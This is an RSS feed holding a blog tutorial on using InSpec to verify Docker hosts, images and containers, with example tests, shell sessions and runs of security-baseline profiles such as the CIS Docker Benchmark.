<?xml version="1.0" encoding="utf-8" ?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>chris-rock</title>
    <atom:link href="http://lollyrock.com/feed.xml" rel="self" type="application/rss+xml"></atom:link>
    <link>http://lollyrock.com</link>
    <description>fun &amp; sun</description>
    <pubDate>Sun, 30 Apr 2017 19:00:00 -0500</pubDate>
    <generator>Wintersmith - https://github.com/jnordberg/wintersmith</generator>
    <language>en</language>
    <item>
      <title>InSpec for Docker</title>
      <link>http://lollyrock.com/articles/inspec-for-docker/</link>
      <pubDate>Sun, 30 Apr 2017 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/inspec-for-docker/</guid>
      <author></author>
      <description>&lt;p&gt;Docker environments enable you to manage fast-moving infrastructure. The faster you move, the better your test environment needs to be. InSpec provides that capability. With the recent addition of 3 new resources: &lt;code&gt;docker&lt;/code&gt;, &lt;code&gt;docker_image&lt;/code&gt; and a &lt;code&gt;docker_container&lt;/code&gt;, it became even easier to verify docker hosts and docker containers. This blog post demonstrates how to use InSpec to verify your Docker environments.&lt;/p&gt;
&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
&lt;p&gt;&lt;center&gt;&lt;img src=&quot;/articles/inspec-for-docker/inspec-docker.png&quot; alt=&quot;&quot; title=&quot;Docker Architecture Overview&quot; width=&quot;700px&quot;&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;Before I am talking about docker infrastructure testing, I need to explain the different parts of the docker universe quickly.&lt;/p&gt;
&lt;p&gt;&lt;center style=&quot;font-size: 14px&quot;&gt;&lt;img src=&quot;/articles/inspec-for-docker/docker-architecture.svg&quot; alt=&quot;&quot; title=&quot;Docker Architecture Overview&quot; width=&quot;700px&quot;&gt;Source: &lt;a href=&quot;https://docs.docker.com/engine/docker-overview/#docker-architecture&quot;&gt;https://docs.docker.com/engine/docker-overview/#docker-architecture&lt;/a&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;A docker host is the runtime environment (docker cli + docker daemon) that manages docker images and containers on a machine. Therefore it helps to manages the complete lifecycle of a container and provides a nice CLI to interact. The docker daemon can start multiple containers in parallel. A good read to understand containers is &lt;a href=&quot;https://news.ycombinator.com/item?id=13982620&quot;&gt;Containers vs. Zones vs. Jails vs. VMs&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;InSpec allows you to scan both, the host and the running container. At first, I am demonstrating the use of InSpec with a running container to ensure the container is configured correctly. Afterwards, I am going to talk about 3 InSpec resources that help you to verify a docker host environment:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;docker container&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;docker image&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;docker&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Those resources are heavily used in &lt;a href=&quot;https://github.com/dev-sec/cis-docker-benchmark&quot;&gt;DevSec’s CIS Docker Benchmark &lt;/a&gt; to ensure best-practices security configuration for docker hosts.&lt;/p&gt;
&lt;h2 id=&quot;verify-a-running-container&quot;&gt;Verify a running container&lt;/h2&gt;
&lt;p&gt;The simplest use-case is to verify a running docker container. Just start a new container by&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker run -it alpine /bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, we can use InSpec to run the &lt;a href=&quot;https://github.com/dev-sec/linux-baseline&quot;&gt;DevSec Linux Baseline&lt;/a&gt; against that container:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ inspec exec https://github.com/dev-sec/linux-baseline -t docker://ca2dbee25ddc
Profile: DevSec Linux Security Baseline (linux-baseline)
Version: 2.0.1
Target:  docker://ca2dbee25ddca24f453005a15cd64f1004fbe6f974df957658fcdf6d1fa6331e

  ✔  os-01: Trusted hosts login
     ✔  Command find / -name &amp;#39;.rhosts&amp;#39; stdout should be empty
     ✔  Command find / -name &amp;#39;hosts.equiv&amp;#39;  stdout should be empty
  ×  os-02: Check owner and permissions for /etc/shadow (1 failed)
     ✔  File /etc/shadow should exist
     ✔  File /etc/shadow should be file
     ✔  File /etc/shadow should be owned by &amp;quot;root&amp;quot;
     ✔  File /etc/shadow should not be executable
     ✔  File /etc/shadow should be writable by owner
     ✔  File /etc/shadow should be readable by owner
     ✔  File /etc/shadow should not be readable by other
     ×  File /etc/shadow group should eq nil

     expected: nil
          got: &amp;quot;shadow&amp;quot;

     (compared using ==)

...

  ✔  sysctl-31a: Secure Core Dumps - dump settings
    ✔  Kernel Parameter fs.suid_dumpable value should cmp == /(0|2)/
  ↺  sysctl-31b: Secure Core Dumps - dump path
    ↺  Skipped control due to only_if condition.
  ✔  sysctl-32: kernel.randomize_va_space
    ✔  Kernel Parameter kernel.randomize_va_space value should eq 2
  ✔  sysctl-33: CPU No execution Flag or Kernel ExecShield
    ✔  /proc/cpuinfo Flags should include NX

  Profile Summary: 20 successful, 23 failures, 7 skipped
  Test Summary: 46 successful, 56 failures, 9 skipped
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You can write your own tests and run those against a running container, too. Further information about the available InSpec resources is available at &lt;a href=&quot;https://www.inspec.io/docs/&quot;&gt;InSpec Docs&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;how-to-use-docker_container-&quot;&gt;How to use ‘docker_container’&lt;/h2&gt;
&lt;p&gt;The &lt;code&gt;docker_container&lt;/code&gt; resource helps you to verify running container. For the following test, I am going to start a new postgres database:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker run --name some-postgres -e POSTGRES_PASSWORD=mysecretpassword -d  -p 5432:5432 postgres
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I’d like to write a test that ensures the container &lt;code&gt;some-postgres&lt;/code&gt; runs and the port is mapped. A simple InSpec test can do the trick:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;describe docker_container(&amp;#39;some-postgres&amp;#39;) do
  it { should exist }
  it { should be_running }
  its(&amp;#39;repo&amp;#39;) { should eq &amp;#39;postgres&amp;#39; }
  its(&amp;#39;ports&amp;#39;) { should eq &amp;quot;0.0.0.0:5432-&amp;gt;5432/tcp&amp;quot; }
  its(&amp;#39;command&amp;#39;) { should eq &amp;#39;docker-entrypoint.sh postgres&amp;#39; }
end
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I am going to run that test that quickly in InSpec Shell, but you can use the same test in a &lt;code&gt;test.rb&lt;/code&gt; and run &lt;code&gt;inspec exec test.rb&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;inspec shell
Welcome to the interactive InSpec Shell
To find out how to use it, type: help

You are currently running on:

    OS platform:  mac_os_x
    OS family:  darwin
    OS release: 10.12.4

inspec&amp;gt; describe docker_container(&amp;#39;some-postgres&amp;#39;) do
inspec&amp;gt;   it { should exist }  
inspec&amp;gt;   it { should be_running }  
inspec&amp;gt;   its(&amp;#39;repo&amp;#39;) { should eq &amp;#39;postgres&amp;#39; }  
inspec&amp;gt;   its(&amp;#39;ports&amp;#39;) { should eq &amp;quot;0.0.0.0:5432-&amp;gt;5432/tcp&amp;quot; }  
inspec&amp;gt;   its(&amp;#39;command&amp;#39;) { should eq &amp;#39;docker-entrypoint.sh postgres&amp;#39; }  
inspec&amp;gt; end  

Profile: inspec-shell
Version: (not specified)

  Docker Container
     ✔  some-postgres should exist
     ✔  some-postgres should be running
     ✔  some-postgres repo should eq &amp;quot;postgres&amp;quot;
     ✔  some-postgres ports should eq &amp;quot;0.0.0.0:5432-&amp;gt;5432/tcp&amp;quot;
     ✔  some-postgres command should eq &amp;quot;docker-entrypoint.sh postgres&amp;quot;

Test Summary: 5 successful, 0 failures, 0 skipped
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In case you want to verify a specific container id, you can do that as well:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;describe docker_container(id: &amp;#39;a3df5ff6740f&amp;#39;) do
  it { should exist }
  it { should be_running }
end
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;how-to-use-docker_image-&quot;&gt;How to use ‘docker_image’&lt;/h2&gt;
&lt;p&gt;Another use-case I am seeing very often is to ensure a specific Docker image is not used in your environment anymore. I am going to use Ubuntu 12.04 as an example, since it went &lt;a href=&quot;http://fridge.ubuntu.com/2017/03/15/ubuntu-12-04-precise-pangolin-reaches-end-of-life-on-april-28-2017/&quot;&gt;end of life&lt;/a&gt; recently. The following test ensures that &lt;code&gt;u12:latest&lt;/code&gt; image is available on your docker host:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;describe docker_image(&amp;#39;u12:latest&amp;#39;) do
  it { should_not exist }
end
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Lets run it in InSpec Shell quickly:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;inspec shell
Welcome to the interactive InSpec Shell
To find out how to use it, type: help

You are currently running on:

    OS platform:  mac_os_x
    OS family:  darwin
    OS release: 10.12.4

inspec&amp;gt; describe docker_image(&amp;#39;u12:latest&amp;#39;) do
inspec&amp;gt;   it { should_not exist }  
inspec&amp;gt; end  

Profile: inspec-shell
Version: (not specified)

  Docker Image
     ✔  u12:latest should not exist

Test Summary: 1 successful, 0 failures, 0 skipped
inspec&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;docker_image&lt;/code&gt; resource can also be used to verify a specific image id:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;describe docker_image(&amp;#39;alpine:latest&amp;#39;) do
  it { should exist }
  its(&amp;#39;id&amp;#39;) { should eq &amp;#39;sha256:4a415e3663882fbc554ee830889c68a33b3585503892cc718a4698e91ef2a526&amp;#39; }
  its(&amp;#39;image&amp;#39;) { should eq &amp;#39;alpine:latest&amp;#39; }
  its(&amp;#39;repo&amp;#39;) { should eq &amp;#39;alpine&amp;#39; }
  its(&amp;#39;tag&amp;#39;) { should eq &amp;#39;latest&amp;#39; }
end
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In addition you could also verify that no container is using the &lt;code&gt;u12:latest&lt;/code&gt; image. We ask InSpec to return all images of the containers. This will return a list of images used by the containers. As a next step, we just have to ensure the specific image is not used anymore.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;describe docker.containers do
  its(&amp;#39;images&amp;#39;) { should_not include &amp;#39;u12:latest&amp;#39; }
end
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;more-advanced-used-cases-with-docker-resource&quot;&gt;More advanced used cases with ‘docker’ resource&lt;/h2&gt;
&lt;p&gt;The &lt;code&gt;docker&lt;/code&gt; resource is more complex to use than &lt;code&gt;docker_image&lt;/code&gt; and &lt;code&gt;docker_container&lt;/code&gt;, but allows you to implement more complex query scenarios. It provides 4 key methods to fetch more information about the docker host:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;containers&lt;/code&gt; returns all running and exited containers by running &lt;code&gt;docker ps -a --no-trunc&lt;/code&gt; under the hood&lt;/li&gt;
&lt;li&gt;&lt;code&gt;images&lt;/code&gt; returns all locally available images by running &lt;code&gt;docker images -a --no-trunc&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;version&lt;/code&gt; is the parsed content of &lt;code&gt;docker version&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;object(id)&lt;/code&gt; returns information about a docker object and parses the output from &lt;code&gt;docker inspect id&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Docker Containers&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;describe docker.containers do
  its(&amp;#39;images&amp;#39;) { should_not include &amp;#39;u12:latest&amp;#39; }
end
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let us inspec the &lt;code&gt;docker&lt;/code&gt; resource with InSpec Shell. This will show two containers, one is already exited and another one is still running:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ inspec shell
dockeWelcome to the interactive InSpec Shell
To find out how to use it, type: help

You are currently running on:

    OS platform:  mac_os_x
    OS family:  darwin
    OS release: 10.12.4

inspec&amp;gt; docker.containers.entries
=&amp;gt; [docker.containers.entries
=&amp;gt; [#&amp;lt;struct
  command=&amp;quot;\&amp;quot;/bin/sh\&amp;quot;&amp;quot;,
  id=&amp;quot;ca2dbee25ddca24f453005a15cd64f1004fbe6f974df957658fcdf6d1fa6331e&amp;quot;,
  image=&amp;quot;alpine&amp;quot;,
  labels=&amp;quot;&amp;quot;,
  localvolumes=&amp;quot;0&amp;quot;,
  mounts=&amp;quot;&amp;quot;,
  names=&amp;quot;keen_dijkstra&amp;quot;,
  networks=&amp;quot;bridge&amp;quot;,
  ports=&amp;quot;&amp;quot;,
  runningfor=&amp;quot;About an hour ago&amp;quot;,
  size=&amp;quot;0B&amp;quot;,
  status=&amp;quot;Exited (127) 13 seconds ago&amp;quot;,
  exists?=nil,
  running?=nil&amp;gt;,
 #&amp;lt;struct
  command=&amp;quot;\&amp;quot;docker-entrypoint.sh postgres\&amp;quot;&amp;quot;,
  id=&amp;quot;921f6363ceaa3c5253a31068a0c8cb7b3a78c1353cf6b4125c7a5460d4e8ce2a&amp;quot;,
  image=&amp;quot;postgres&amp;quot;,
  labels=&amp;quot;&amp;quot;,
  localvolumes=&amp;quot;1&amp;quot;,
  mounts=&amp;quot;afee92bcd2e8e84cccf884cd42443f0ff718789dca271e7497a308e22622514a&amp;quot;,
  names=&amp;quot;some-postgres&amp;quot;,
  networks=&amp;quot;bridge&amp;quot;,
  ports=&amp;quot;0.0.0.0:5432-&amp;gt;5432/tcp&amp;quot;,
  runningfor=&amp;quot;3 hours ago&amp;quot;,
  size=&amp;quot;0B&amp;quot;,
  status=&amp;quot;Up 3 hours&amp;quot;,
  exists?=nil,
  running?=nil&amp;gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The resource allows you to ask for all running containers:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker.containers.running?.entries
=&amp;gt; [#&amp;lt;struct
  command=&amp;quot;\&amp;quot;docker-entrypoint.sh postgres\&amp;quot;&amp;quot;,
  id=&amp;quot;921f6363ceaa3c5253a31068a0c8cb7b3a78c1353cf6b4125c7a5460d4e8ce2a&amp;quot;,
  image=&amp;quot;postgres&amp;quot;,
  labels=&amp;quot;&amp;quot;,
  localvolumes=&amp;quot;1&amp;quot;,
  mounts=&amp;quot;afee92bcd2e8e84cccf884cd42443f0ff718789dca271e7497a308e22622514a&amp;quot;,
  names=&amp;quot;some-postgres&amp;quot;,
  networks=&amp;quot;bridge&amp;quot;,
  ports=&amp;quot;0.0.0.0:5432-&amp;gt;5432/tcp&amp;quot;,
  runningfor=&amp;quot;3 hours ago&amp;quot;,
  size=&amp;quot;0B&amp;quot;,
  status=&amp;quot;Up 3 hours&amp;quot;,
  exists?=nil,
  running?=nil&amp;gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You can also filter containers by the following fields: &lt;code&gt;commands&lt;/code&gt;, &lt;code&gt;ids&lt;/code&gt;, &lt;code&gt;images&lt;/code&gt;, &lt;code&gt;labels&lt;/code&gt;, &lt;code&gt;local_volumes&lt;/code&gt;, &lt;code&gt;mounts&lt;/code&gt;, &lt;code&gt;names&lt;/code&gt;, &lt;code&gt;networks&lt;/code&gt;, &lt;code&gt;ports&lt;/code&gt;, &lt;code&gt;running_for&lt;/code&gt;, &lt;code&gt;sizes&lt;/code&gt;,&lt;code&gt;status&lt;/code&gt;, &lt;code&gt;running?&lt;/code&gt;,&lt;code&gt;exists?&lt;/code&gt;. For example, if you want to verify the configuration for each container, you can do the following in InSpec:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# returns all container ids
docker.containers.ids.each do |id|
  # call docker inspect to retrieve detailed information about the container
  describe docker.object(id) do
    its(&amp;#39;HostConfig.Privileged&amp;#39;) { should cmp false }
  end
end
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you want to do the following for running containers, just say so:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# returns all running container ids
docker.containers.running?.ids.each do |id|
  # call docker inspect to retrieve detailed information about the container
  describe docker.object(id) do
    its(&amp;#39;HostConfig.Privileged&amp;#39;) { should cmp false }
  end
end
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you a looking for a specific container:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# returns all running container ids
docker.containers.where { names == &amp;#39;some-postgres&amp;#39; }.ids.each do |id|
  # call docker inspect to retrieve detailed information about the container
  describe docker.object(id) do
    its(&amp;#39;HostConfig.Privileged&amp;#39;) { should cmp false }
  end
end
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Docker Images&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Docker images can be inspected with a similar approach:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;describe docker.images do
  its(&amp;#39;repositories&amp;#39;) { should_not include &amp;#39;inssecure_image&amp;#39; }
end
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You can also filter images by the following fields: &lt;code&gt;ids&lt;/code&gt;, &lt;code&gt;repositories&lt;/code&gt;, &lt;code&gt;tags&lt;/code&gt;, &lt;code&gt;sizes&lt;/code&gt;, &lt;code&gt;digests&lt;/code&gt;, &lt;code&gt;created&lt;/code&gt;, &lt;code&gt;created_since&lt;/code&gt; and &lt;code&gt;exists?&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;If you want to verify that no image is using the ADD instruction in Dockerfile, you can iterate over all image ids and ask &lt;code&gt;docker history&lt;/code&gt; if the ADD instruction was used:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker.images.ids.each do |id|
  describe command(&amp;quot;docker history #{id}| grep &amp;#39;ADD&amp;#39;&amp;quot;) do
    its(&amp;#39;stdout&amp;#39;) { should eq &amp;#39;&amp;#39; }
  end
end
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Docker Version&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;InSpec allows you to verify the docker client and server version that is used on your machine. Behind the scenes, it is using the &lt;code&gt;docker version&lt;/code&gt; command. This would return the following values:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ docker version
Client:
 Version:      17.05.0-ce-rc1
 API version:  1.29
 Go version:   go1.7.5
 Git commit:   2878a85
 Built:        Tue Apr 11 20:55:05 2017
 OS/Arch:      darwin/amd64

Server:
 Version:      17.05.0-ce-rc1
 API version:  1.29 (minimum version 1.12)
 Go version:   go1.7.5
 Git commit:   2878a85
 Built:        Tue Apr 11 20:55:05 2017
 OS/Arch:      linux/amd64
 Experimental: true
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In InSpec Shell, you see the parsed values:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;inspec&amp;gt; docker.version
=&amp;gt; {&amp;quot;Client&amp;quot;=&amp;gt;
  {&amp;quot;Version&amp;quot;=&amp;gt;&amp;quot;17.05.0-ce-rc1&amp;quot;,
   &amp;quot;ApiVersion&amp;quot;=&amp;gt;&amp;quot;1.29&amp;quot;,
   &amp;quot;DefaultAPIVersion&amp;quot;=&amp;gt;&amp;quot;1.29&amp;quot;,
   &amp;quot;GitCommit&amp;quot;=&amp;gt;&amp;quot;2878a85&amp;quot;,
   &amp;quot;GoVersion&amp;quot;=&amp;gt;&amp;quot;go1.7.5&amp;quot;,
   &amp;quot;Os&amp;quot;=&amp;gt;&amp;quot;darwin&amp;quot;,
   &amp;quot;Arch&amp;quot;=&amp;gt;&amp;quot;amd64&amp;quot;,
   &amp;quot;BuildTime&amp;quot;=&amp;gt;&amp;quot;Tue Apr 11 20:55:05 2017&amp;quot;},
 &amp;quot;Server&amp;quot;=&amp;gt;
  {&amp;quot;Version&amp;quot;=&amp;gt;&amp;quot;17.05.0-ce-rc1&amp;quot;,
   &amp;quot;ApiVersion&amp;quot;=&amp;gt;&amp;quot;1.29&amp;quot;,
   &amp;quot;MinAPIVersion&amp;quot;=&amp;gt;&amp;quot;1.12&amp;quot;,
   &amp;quot;GitCommit&amp;quot;=&amp;gt;&amp;quot;2878a85&amp;quot;,
   &amp;quot;GoVersion&amp;quot;=&amp;gt;&amp;quot;go1.7.5&amp;quot;,
   &amp;quot;Os&amp;quot;=&amp;gt;&amp;quot;linux&amp;quot;,
   &amp;quot;Arch&amp;quot;=&amp;gt;&amp;quot;amd64&amp;quot;,
   &amp;quot;KernelVersion&amp;quot;=&amp;gt;&amp;quot;4.9.21-moby&amp;quot;,
   &amp;quot;Experimental&amp;quot;=&amp;gt;true,
   &amp;quot;BuildTime&amp;quot;=&amp;gt;&amp;quot;Tue Apr 11 20:55:05 2017&amp;quot;}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, I am going to write a check that ensures docker is newer than &lt;code&gt;1.12&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;describe docker.version do
  its(&amp;#39;Server.Version&amp;#39;) { should cmp &amp;gt;= &amp;#39;1.12&amp;#39;}
  its(&amp;#39;Client.Version&amp;#39;) { should cmp &amp;gt;= &amp;#39;1.12&amp;#39;}
end
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Docker Info&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker.info&lt;/code&gt; parses the output of &lt;code&gt;docker info&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker info
Containers: 5
 Running: 1
 Paused: 0
 Stopped: 4
Images: 108
Server Version: 17.05.0-ce-rc1
....
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Again, you can inspect all values in InSpec with InSpec Shell:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;inspec&amp;gt; docker.info
=&amp;gt; {&amp;quot;ID&amp;quot;=&amp;gt;&amp;quot;YMXQ:5C62:Q3AR:XV77:7LS6:O56G:A6VZ:V5LJ:WNNJ:UQTO:QKPB:K62P&amp;quot;,
 &amp;quot;Containers&amp;quot;=&amp;gt;5,
 &amp;quot;ContainersRunning&amp;quot;=&amp;gt;1,
 &amp;quot;ContainersPaused&amp;quot;=&amp;gt;0,
 &amp;quot;ContainersStopped&amp;quot;=&amp;gt;4,
 &amp;quot;Images&amp;quot;=&amp;gt;108,
 &amp;quot;Driver&amp;quot;=&amp;gt;&amp;quot;overlay2&amp;quot;,
 &amp;quot;DriverStatus&amp;quot;=&amp;gt;[[&amp;quot;Backing Filesystem&amp;quot;, &amp;quot;extfs&amp;quot;], [&amp;quot;Supports d_type&amp;quot;, &amp;quot;true&amp;quot;], [&amp;quot;Native Overlay Diff&amp;quot;, &amp;quot;true&amp;quot;]],
 &amp;quot;SystemStatus&amp;quot;=&amp;gt;nil,
 &amp;quot;Plugins&amp;quot;=&amp;gt;{&amp;quot;Volume&amp;quot;=&amp;gt;[&amp;quot;local&amp;quot;], &amp;quot;Network&amp;quot;=&amp;gt;[&amp;quot;bridge&amp;quot;, &amp;quot;host&amp;quot;, &amp;quot;ipvlan&amp;quot;, &amp;quot;macvlan&amp;quot;, &amp;quot;null&amp;quot;, &amp;quot;overlay&amp;quot;], &amp;quot;Authorization&amp;quot;=&amp;gt;[]},
 &amp;quot;MemoryLimit&amp;quot;=&amp;gt;true,
 &amp;quot;SwapLimit&amp;quot;=&amp;gt;true,
 &amp;quot;KernelMemory&amp;quot;=&amp;gt;true,
 &amp;quot;CpuCfsPeriod&amp;quot;=&amp;gt;true,
 &amp;quot;CpuCfsQuota&amp;quot;=&amp;gt;true,
 &amp;quot;CPUShares&amp;quot;=&amp;gt;true,
 &amp;quot;CPUSet&amp;quot;=&amp;gt;true,
 &amp;quot;IPv4Forwarding&amp;quot;=&amp;gt;true,
 &amp;quot;BridgeNfIptables&amp;quot;=&amp;gt;true,
 &amp;quot;BridgeNfIp6tables&amp;quot;=&amp;gt;true,
 &amp;quot;Debug&amp;quot;=&amp;gt;true,
 &amp;quot;NFd&amp;quot;=&amp;gt;25,
 &amp;quot;OomKillDisable&amp;quot;=&amp;gt;true,
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, lets ensure we are not running more than 20 containers on a node:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;describe docker.info do
  its(&amp;#39;ContainersRunning&amp;#39;) { should cmp &amp;lt;= 20 }
end
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If Swarm is active, you could verify that you have only a limited amount of leaders:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;describe docker.info do
  its(&amp;#39;Swarm.Managers&amp;#39;) { should cmp &amp;lt;= 3 }
end
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Docker Object&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Each docker object store multiple attributes. Docker allows you to see those values by running &lt;code&gt;docker inspect&lt;/code&gt;. This data is parsed in InSpec too and can be used to verify entries for container and images objects:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;describe docker.object(container_id) do
  its(&amp;#39;Configuration.Path&amp;#39;) { should eq &amp;#39;value&amp;#39; }
end
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Be aware that docker object is very complex and the output varies by object. An example output in InSpec shell looks like:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;inspec&amp;gt; docker.object(&amp;#39;921f6363ceaa3c5253a31068a0c8cb7b3a78c1353cf6b4125c7a5460d4e8ce2a&amp;#39;)
=&amp;gt; {&amp;quot;Id&amp;quot;=&amp;gt;&amp;quot;921f6363ceaa3c5253a31068a0c8cb7b3a78c1353cf6b4125c7a5460d4e8ce2a&amp;quot;,
 &amp;quot;Created&amp;quot;=&amp;gt;&amp;quot;2017-04-29T11:27:45.846552618Z&amp;quot;,
 &amp;quot;Path&amp;quot;=&amp;gt;&amp;quot;docker-entrypoint.sh&amp;quot;,
 &amp;quot;Args&amp;quot;=&amp;gt;[&amp;quot;postgres&amp;quot;],
 &amp;quot;State&amp;quot;=&amp;gt;
  {&amp;quot;Status&amp;quot;=&amp;gt;&amp;quot;running&amp;quot;,
   &amp;quot;Running&amp;quot;=&amp;gt;true,
   &amp;quot;Paused&amp;quot;=&amp;gt;false,
   &amp;quot;Restarting&amp;quot;=&amp;gt;false,
   &amp;quot;OOMKilled&amp;quot;=&amp;gt;false,
   &amp;quot;Dead&amp;quot;=&amp;gt;false,
   &amp;quot;Pid&amp;quot;=&amp;gt;18850,
   &amp;quot;ExitCode&amp;quot;=&amp;gt;0,
   &amp;quot;Error&amp;quot;=&amp;gt;&amp;quot;&amp;quot;,
   &amp;quot;StartedAt&amp;quot;=&amp;gt;&amp;quot;2017-04-29T11:27:46.414873644Z&amp;quot;,
   &amp;quot;FinishedAt&amp;quot;=&amp;gt;&amp;quot;0001-01-01T00:00:00Z&amp;quot;},
 &amp;quot;Image&amp;quot;=&amp;gt;&amp;quot;sha256:390220867755ef4d1351705130960605d14a44518149e89c674189eefcb09306&amp;quot;,
 &amp;quot;ResolvConfPath&amp;quot;=&amp;gt;&amp;quot;/var/lib/docker/containers/921f6363ceaa3c5253a31068a0c8cb7b3a78c1353cf6b4125c7a5460d4e8ce2a/resolv.conf&amp;quot;,
 &amp;quot;HostnamePath&amp;quot;=&amp;gt;&amp;quot;/var/lib/docker/containers/921f6363ceaa3c5253a31068a0c8cb7b3a78c1353cf6b4125c7a5460d4e8ce2a/hostname&amp;quot;,
 &amp;quot;HostsPath&amp;quot;=&amp;gt;&amp;quot;/var/lib/docker/containers/921f6363ceaa3c5253a31068a0c8cb7b3a78c1353cf6b4125c7a5460d4e8ce2a/hosts&amp;quot;,
 &amp;quot;LogPath&amp;quot;=&amp;gt;&amp;quot;/var/lib/docker/containers/921f6363ceaa3c5253a31068a0c8cb7b3a78c1353cf6b4125c7a5460d4e8ce2a/921f6363ceaa3c5253a31068a0c8cb7b3a78c1353cf6b4125c7a5460d4e8ce2a-json.log&amp;quot;,
 &amp;quot;Name&amp;quot;=&amp;gt;&amp;quot;/some-postgres&amp;quot;,
 &amp;quot;AppArmorProfile&amp;quot;=&amp;gt;&amp;quot;&amp;quot;,
 `
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;verify-secure-configuration&quot;&gt;Verify secure configuration&lt;/h2&gt;
&lt;p&gt;If you are going to run your own docker environment in production, you should make the additional work to harden the docker environment. The &lt;a href=&quot;https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf&quot;&gt;CIS Docker Benchmark&lt;/a&gt; provides a detailed overview about all best-practices. Based on those guidelines, the &lt;a href=&quot;http://atomic111.github.io/blog/inspec-cis-docker&quot;&gt;DevSec Hardening Framework Team&lt;/a&gt; implemented a machine-readable version that allows you to easily execute the tests. To execute the InSpec profile, just run:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ inspec exec https://github.com/dev-sec/cis-docker-benchmark
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;This blog post covered various aspects of docker environment verification ranging from docker hosts to docker container. If you feel that something is missing, please let me know.&lt;/p&gt;
&lt;p&gt;Stay secure, Chris&lt;/p&gt;
&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;ul&gt;
